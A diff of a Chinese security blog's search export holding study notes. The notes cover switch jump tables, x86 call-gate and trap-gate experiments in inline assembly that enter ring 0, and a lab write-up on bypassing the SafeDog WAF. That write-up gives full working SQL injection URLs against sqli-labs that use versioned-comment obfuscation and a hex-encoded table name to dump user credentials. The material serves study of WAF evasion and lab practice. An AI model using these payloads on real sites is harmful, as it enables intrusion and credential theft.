-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">8</span>:        <span class="keyword">int</span> a = <span class="number">10</span>;</span><br><span class="line"><span class="number">00401028</span>   mov         dword ptr [ebp<span class="number">-4</span>],<span class="number">0</span>Ah</span><br><span class="line"><span class="number">9</span>:        <span class="keyword">switch</span>(a)</span><br><span class="line"><span class="number">10</span>:       &#123;</span><br><span class="line"><span class="number">0040102F</span>   mov         eax,dword ptr [ebp<span class="number">-4</span>]</span><br><span class="line"><span class="number">00401032</span>   mov         dword ptr [ebp<span class="number">-8</span>],eax</span><br><span class="line"><span class="number">00401035</span>   cmp         dword ptr [ebp<span class="number">-8</span>],<span class="number">4</span></span><br><span class="line"><span class="number">00401039</span>   ja          $L540+<span class="number">0F</span>h (<span class="number">00401090</span>)</span><br><span class="line"><span class="number">0040103B</span>   mov         ecx,dword ptr [ebp<span class="number">-8</span>]</span><br><span class="line"><span class="number">0040103</span>E   jmp         dword ptr [ecx*<span class="number">4</span>+<span class="number">4010B</span>0h]</span><br><span class="line"><span class="number">11</span>:           <span class="keyword">case</span> <span class="number">0</span>: <span class="built_in">printf</span>(<span class="string">&quot;hello\n&quot;</span>); <span class="keyword">break</span>;</span><br><span class="line"><span class="number">00401045</span>   push        offset <span class="built_in">string</span> <span class="string">&quot;hello\n&quot;</span> (<span class="number">00420024</span>)</span><br><span class="line"><span class="number">0040104</span><span class="function">A   call        <span class="title">printf</span> <span class="params">(<span class="number">00401120</span>)</span></span></span><br><span class="line">0040104F   add         esp,4</span><br><span class="line"><span class="number">00401052</span>   jmp         $L540+<span class="number">1</span>Ch (<span class="number">0040109</span>d)</span><br><span class="line"><span class="number">12</span>:           <span class="keyword">case</span> <span class="number">1</span>: <span class="built_in">printf</span>(<span class="string">&quot;hello\n&quot;</span>); <span class="keyword">break</span>;</span><br><span class="line"><span class="number">00401054</span>   push        offset <span class="built_in">string</span> <span class="string">&quot;hello\n&quot;</span> (<span class="number">00420024</span>)</span><br><span class="line"><span class="number">00401059</span>   <span class="function">call        <span class="title">printf</span> <span class="params">(<span class="number">00401120</span>)</span></span></span><br><span class="line">0040105E   add         esp,4</span><br><span class="line"><span class="number">00401061</span>   jmp         $L540+<span class="number">1</span>Ch (<span class="number">0040109</span>d)</span><br><span class="line"><span class="number">13</span>:           <span class="keyword">case</span> <span class="number">2</span>: <span class="built_in">printf</span>(<span class="string">&quot;hello\n&quot;</span>); <span class="keyword">break</span>;</span><br><span class="line"><span class="number">00401063</span>   push        offset <span class="built_in">string</span> <span class="string">&quot;hello\n&quot;</span> (<span class="number">00420024</span>)</span><br><span class="line"><span class="number">00401068</span>   <span class="function">call        <span class="title">printf</span> <span class="params">(<span class="number">00401120</span>)</span></span></span><br><span class="line">0040106D   add         esp,4</span><br><span class="line"><span class="number">00401070</span>   jmp         $L540+<span class="number">1</span>Ch (<span class="number">0040109</span>d)</span><br><span class="line"><span class="number">14</span>:           <span class="keyword">case</span> <span class="number">3</span>: <span class="built_in">printf</span>(<span class="string">&quot;hello\n&quot;</span>); <span class="keyword">break</span>;</span><br><span class="line"><span class="number">00401072</span>   push        offset <span class="built_in">string</span> <span class="string">&quot;hello\n&quot;</span> (<span class="number">00420024</span>)</span><br><span class="line"><span class="number">00401077</span>   <span class="function">call        <span class="title">printf</span> <span class="params">(<span class="number">00401120</span>)</span></span></span><br><span class="line">0040107C   add         esp,4</span><br><span class="line"><span class="number">0040107F</span>   jmp         $L540+<span class="number">1</span>Ch (<span class="number">0040109</span>d)</span><br><span class="line"><span class="number">15</span>:           <span class="keyword">case</span> <span class="number">4</span>: <span class="built_in">printf</span>(<span class="string">&quot;hello\n&quot;</span>); <span class="keyword">break</span>;</span><br><span class="line"><span class="number">00401081</span>   push        offset <span class="built_in">string</span> <span class="string">&quot;hello\n&quot;</span> (<span class="number">00420024</span>)</span><br><span class="line"><span class="number">00401086</span>   <span class="function">call        <span class="title">printf</span> <span class="params">(<span class="number">00401120</span>)</span></span></span><br><span class="line">0040108B   add         esp,4</span><br><span class="line"><span class="number">0040108</span>E   jmp         $L540+<span class="number">1</span>Ch (<span class="number">0040109</span>d)</span><br><span class="line"><span class="number">16</span>:           <span class="keyword">default</span>:</span><br><span class="line"><span class="number">17</span>:               <span class="built_in">printf</span>(<span class="string">&quot;end\n&quot;</span>);</span><br><span class="line"><span class="number">00401090</span>   push        offset <span class="built_in">string</span> <span class="string">&quot;end\n&quot;</span> (<span class="number">0042001</span>c)</span><br><span class="line"><span class="number">00401095</span>   <span class="function">call        <span class="title">printf</span> <span class="params">(<span class="number">00401120</span>)</span></span></span><br><span class="line">0040109A   add         esp,4</span><br><span class="line"><span class="number">18</span>:           <span class="keyword">break</span>;</span><br><span class="line"><span class="number">19</span>:       &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>我们会发现很独特的一行<br><code>0040103E   jmp         dword ptr [ecx*4+4010B0h]</code><br>这是一个计算跳转地址的公式<br>当我们查看<code>4010B0h</code>这个地址时是如下内容</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">004010B0  45 10 40 00  </span><br><span class="line">004010B4  54 10 40 00 </span><br><span class="line">004010B8  63 10 40 00 </span><br><span class="line">004010BC  72 10 40 00 </span><br><span class="line">004010C0  81 10 40 00</span><br></pre></td></tr></table></figure>
-<p>就会发现这是每个case的地址</p>
-<p>将条件分支的跨度再次调大时我们把上面的<code>case 4 :</code> 调整为 <code>case 20 :</code>会发现这样的一个地址映射表</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0040B890  00 01 02 03  </span><br><span class="line">0040B894  05 05 05 05  </span><br><span class="line">0040B898  05 05 05 05  </span><br><span class="line">0040B89C  05 05 05 05  </span><br><span class="line">0040B8A0  05 05 05 05  </span><br><span class="line">0040B8A4  04 CC CC CC  </span><br></pre></td></tr></table></figure>
-<p>姑且叫做小表，每个值都代表着对应地址映射表的位置</p>
-<p>再将尺度调大，对于特别大的会进行判断，对于跨度小的还是公式计算，<br>当每一个跨度都特别大而且不连续那就又回到if的判断方式</p>
-]]></content>
-      <tags>
-        <tag>c</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>调用门笔记</title>
-    <url>/2021/02/04/%E8%B0%83%E7%94%A8%E9%97%A8%E7%AC%94%E8%AE%B0/</url>
-    <content><![CDATA[<h1 id="0x00-练习1"><a href="#0x00-练习1" class="headerlink" title="0x00 练习1"></a>0x00 练习1</h1><p>3环程序通过调用门进0环，再通过修改堆栈实现任意跳转，再调用调用门，修复堆栈retf回主函数，程序回到3环</p>
-<a id="more"></a>
-
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> cs_eip[<span class="number">6</span>] = &#123;<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0x48</span>, <span class="number">0</span>&#125;;</span><br><span class="line">DWORD g_esp;</span><br><span class="line"></span><br><span class="line">__declspec(naked) <span class="function"><span class="keyword">void</span> <span class="title">CallGate</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">		<span class="comment">//int 3</span></span><br><span class="line">        pushfd</span><br><span class="line">        pushad</span><br><span class="line">		mov eax,esp</span><br><span class="line">		mov [eax+<span class="number">0x24</span>],<span class="number">0x00401060</span></span><br><span class="line">		mov [eax+<span class="number">0x24</span>+<span class="number">0x4</span>],<span class="number">0x08</span></span><br><span class="line">		mov ebx,dword ptr[eax+<span class="number">0x24</span>+<span class="number">0x8</span>]</span><br><span class="line">		mov g_esp,ebx</span><br><span class="line">		mov [eax+<span class="number">0x24</span>+<span class="number">0x8</span>],esp</span><br><span class="line">		mov [eax+<span class="number">0x24</span>+<span class="number">0x1c</span>],ss</span><br><span class="line">		popad</span><br><span class="line">        popfd</span><br><span class="line">        retf</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__declspec(naked) <span class="function"><span class="keyword">void</span> <span class="title">CallGate1</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">		<span class="comment">//int 3</span></span><br><span class="line">		mov eax,<span class="number">0x8003f048</span></span><br><span class="line">		mov [eax],<span class="number">0x80</span></span><br><span class="line">		call fword ptr [cs_eip]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__declspec(naked) <span class="function"><span class="keyword">void</span> <span class="title">CallGate2</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   __asm</span><br><span class="line">	&#123;</span><br><span class="line">	<span class="comment">//	int 3</span></span><br><span class="line">		mov eax,esp</span><br><span class="line">		mov dword ptr[eax],<span class="number">0x004010ce</span></span><br><span class="line">		mov dword ptr[eax+<span class="number">0x4</span>],<span class="number">0x1b</span></span><br><span class="line">		mov ebx,g_esp</span><br><span class="line">		mov [eax+<span class="number">8</span>],ebx</span><br><span class="line">		mov [eax+<span class="number">0x1c</span>],<span class="number">0x23</span></span><br><span class="line">		retf</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        call fword ptr [cs_eip]</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
-
-]]></content>
-      <tags>
-        <tag>笔记</tag>
-        <tag>保护模式</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>陷阱门练习</title>
-    <url>/2021/02/06/%E9%99%B7%E9%98%B1%E9%97%A8%E7%BB%83%E4%B9%A0/</url>
-    <content><![CDATA[<h1 id="0x00-陷阱门练习"><a href="#0x00-陷阱门练习" class="headerlink" title="0x00 陷阱门练习"></a>0x00 陷阱门练习</h1><p>首先是看陷阱门在IDT表中的描述符</p>
-<p>可见陷阱门和中断门的区别在描述符上仅仅在于第8位是否为1</p>
-<a id="more"></a>
-
-<p><img src="https://i.loli.net/2021/02/06/V3QIiyk1Nc5RGhZ.png" alt="image-20210206225147250"></p>
-<p>而在使用上与中断门的区别仅仅只是中断门会将eflags的IF位清0，而陷阱门不会</p>
-<p>下面进行实验</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">DWORD a_eflags, i_eflags, t_eflags;</span><br><span class="line"></span><br><span class="line">DWORD data;</span><br><span class="line"></span><br><span class="line">__declspec(naked) <span class="function"><span class="keyword">void</span> <span class="title">InterruptGate</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    __asm </span><br><span class="line">	&#123;</span><br><span class="line">		pushad</span><br><span class="line">		pushfd</span><br><span class="line">		mov eax,esp</span><br><span class="line">		mov ebx,[eax]</span><br><span class="line">		mov i_eflags,ebx</span><br><span class="line">		popfd</span><br><span class="line">		popad</span><br><span class="line">		iretd</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__declspec(naked) <span class="function"><span class="keyword">void</span> <span class="title">TrapGate</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    __asm </span><br><span class="line">	&#123;</span><br><span class="line">		pushad</span><br><span class="line">		pushfd</span><br><span class="line">		mov eax,esp</span><br><span class="line">		mov ebx,[eax]</span><br><span class="line">		mov t_eflags,ebx</span><br><span class="line">		popfd</span><br><span class="line">		popad</span><br><span class="line">		iretd</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">		pushfd</span><br><span class="line">		mov eax,esp</span><br><span class="line">		mov ebx,[eax]</span><br><span class="line">		mov a_eflags,ebx</span><br><span class="line">		popfd</span><br><span class="line">        <span class="keyword">int</span> <span class="number">0x20</span> <span class="comment">//Call InterruptGate</span></span><br><span class="line">		<span class="keyword">int</span> <span class="number">0x21</span> <span class="comment">//Call TrapGate</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;after: %x \ninterrupt: %x \ntrap: %x\n&quot;</span>,a_eflags,i_eflags,t_eflags);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>这里结果是</p>
-<blockquote>
-<p>after: 216  –&gt; 0010 0001 0110</p>
-<p>interrupt: 16 –&gt; 0000 0001 0110</p>
-<p>trap: 216 –&gt; 0010 0001 0110</p>
-</blockquote>
-<p> 很明显，第9位被清0</p>
-]]></content>
-      <tags>
-        <tag>笔记</tag>
-        <tag>保护模式</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>过安全狗笔记</title>
-    <url>/2020/08/11/%E8%BF%87%E5%AE%89%E5%85%A8%E7%8B%97%E7%AC%94%E8%AE%B0/</url>
-    <content><![CDATA[<blockquote>
-<p>0x00 起因</p>
-</blockquote>
-<p>今天顾总给我们演示了如何过狗注入，嘻嘻嘻，当然要自己来一遍,当作交作业,嘻嘻嘻</p>
-<a id="more"></a>
-<blockquote>
-<p>0x01 开始</p>
-</blockquote>
-<p>测试点: sqli-lab Less-2</p>
-<p><code>http://192.168.133.132/sqli/Less-2/?id=1</code></p>
-<p><img src="https://i.loli.net/2020/08/11/KJdw1ZkQmYno7HL.png" alt="1.png"></p>
-<p>既然看了顾总的演示,第一步的order by当然要改成group by,成功探测只有三个</p>
-<p>之后便是绕掉<code>SELECT</code>关键字,这里顾总说的是用<code>/*! */</code>注释绕掉成功,这里给44344点赞</p>
-<p><code>http://192.168.133.132/sqli/Less-2/?id=1 union /*!44344select*/ 1,2,3 limit 1,1 --+</code></p>
-<p><img src="https://i.loli.net/2020/08/11/dwyAWuFgOzPY9pt.png" alt="2.png"></p>
-<p><code>http://192.168.133.132/sqli/Less-2/?id=0 union /*!44344select*/ 1,/*!44190database()*/,/*!44190user()*/</code></p>
-<p>之后发现database()怎么都绕不过,我不知道我是不是演示的时候画面卡没注意这个细节,所以分别试了绕database和(),然后用<code>/*!44190database/*!()*/*/</code></p>
-<p><code>http://192.168.133.132/sqli/Less-2/?id=0 union /*!44344select*/ 1,/*!44190database/*!()*/*/,/*!44190user/*!()*/*/</code></p>
-<p>又爆语法错误,看了半天错误信息发现多了<code>*/</code>然后直接删掉括号后一个后成功</p>
-<p><code>http://192.168.133.132/sqli/Less-2/?id=0 union /*!44344select*/ 1,/*!44190database/*!()*/,/*!44190user/*!()*/</code></p>
-<p><img src="https://i.loli.net/2020/08/11/K7MWNeQ1F4cTvsy.png" alt="3.png"></p>
-<p><code>http://192.168.133.132/sqli/Less-2/?id=1 union /*!20444select*/ 1,group_concat(table_name),3 /*!25244from*/ information_schema.tables where table_schema=/*!44190database/*!()*/ limit 1,1 -- jsij</code></p>
-<p>爆表名成功</p>
-<p><img src="https://i.loli.net/2020/08/11/SDd8AnEi2pTfkCr.png" alt="4.png"></p>
-<p><code>http://192.168.133.132/sqli/Less-2/?id=1 union /*!20444select*/ 1,group_concat(column_name),3 /*!25244from*/ information_schema.columns where table_name= &#39;users &#39; limit 1,1 -- jsij</code></p>
-<p><img src="https://i.loli.net/2020/08/11/bWsE87KfT2GANSu.png" alt="5.png"></p>
-<p>卧槽,明明没有错</p>
-<p><img src="https://i.loli.net/2020/08/11/pOoEL9f4JPjyHkY.png" alt="6.png"></p>
-<p>不过很明显输出多了两个<code>/</code>嗯,绕了绕过不去,再看了源码,不过没有转义的函数,不过还是应该是sql把单引号转义掉了,就把<code>users</code>Hex转义成<code>0x7573657273</code>之后测试成功</p>
-<p><code>http://192.168.133.132/sqli/Less-2/?id=1 union /*!20444select*/ 1,group_concat(column_name),3 /*!25244from*/ information_schema.columns where table_name=0x7573657273 limit 1,1 -- jsij</code></p>
-<p><img src="https://i.loli.net/2020/08/11/o3WipwlJPk659LT.png" alt="7.png"></p>
-<p>再来查字段,成功</p>
-<p><code>http://192.168.133.132/sqli/Less-2/?id=1 union /*!20444select*/ 1,group_concat(username,0x3a,password),3 /*!25244from*/ users limit 1,1 -- jsij</code></p>
-<p><img src="https://i.loli.net/2020/08/11/ihqX5F6JVBYsvbm.png" alt="8.png"></p>
-<blockquote>
-<p>0x02 后记</p>
-</blockquote>
-<p>虽然只是复现了顾总的操作,不过依旧很多坑,非常难受</p>
-<p><img src="https://i.loli.net/2020/08/11/x126Eko5g34Dcrl.png" alt="9.png"></p>
-<p>还是这么多条记录,不过幸不辱命还是完成了</p>
-<p>不过这里转义单引号这个事,原因是当php.ini里的magic_quotes_gpc=On时。提交的变量中所有的单引号（’）、双引号（”）、反斜线（\）与 NUL（NULL 字符）会自动转为含有反斜线的转义字符。PHP 5.4 之前 PHP 指令 magic_quotes_gpc 默认是 on.</p>
-]]></content>
-      <tags>
-        <tag>笔记</tag>
-        <tag>渗透测试</tag>
       </tags>
   </entry>
 </search>
